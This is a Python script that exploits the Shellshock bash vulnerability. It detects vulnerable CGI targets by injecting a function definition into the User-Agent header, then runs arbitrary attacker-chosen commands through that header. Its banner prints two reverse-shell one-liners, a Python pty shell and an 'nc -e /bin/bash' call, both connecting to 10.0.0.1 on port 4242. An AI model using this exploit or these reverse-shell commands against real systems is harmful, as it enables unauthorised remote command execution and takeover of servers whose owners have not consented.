import requests
import argparse
import cowsay
import random
from time import sleep

parse = argparse.ArgumentParser()

parse.add_argument('-u', '--url', required=True,
                   help='URL TARGET: https:exemple.com.br/')
parse.add_argument('-c', '--command', help='Request content body')

args = parse.parse_args()


def banner():
    phrases = [
        "SHOCK IN YOUR SISTEM",
        "TRY >>> python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('10.0.0.1',4242));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/sh')'",
        "Do not use this in government institutions or organizations in which you are not allowed!!!",
        "TRY: >>> nc -e /bin/bash 10.0.0.1 4242"
        "I'm a very technological cow",
        "WARNING: Careful, don't use this without permission!"
    ]
    random_number = random.randint(0, 4)
    cowsay.cow(phrases[random_number])
    print("v0.1 ====== Created by Az4ar")
    sleep(2)


def isVulnerable(url):
    payload = {"User-Agent": "() { :; };echo; /bin/echo 'Hello World'"}
    res = requests.get(url, headers=payload)
    exploitable = ''

    if "Hello World" in res.text:
        exploitable = True
    else:
        print("\n[+] The target does not appear to be vulnerable\n")
        exploitable = False

    return exploitable


def stop_app():
    print("\n:: App Aborted!\n")
    exit(1)


def exploit(url, cmd):
    if not isVulnerable(url):
        exit(1)
    try:
        banner()

        payload = {
            "User-Agent": "() { :echo; };echo; /bin/bash -c " + f"'{cmd}'"
        }
  
        res = requests.get(url, headers=payload)
        print("\n" + res.text)
    except KeyboardInterrupt:
        stop_app()

exploit(args.url, args.command)
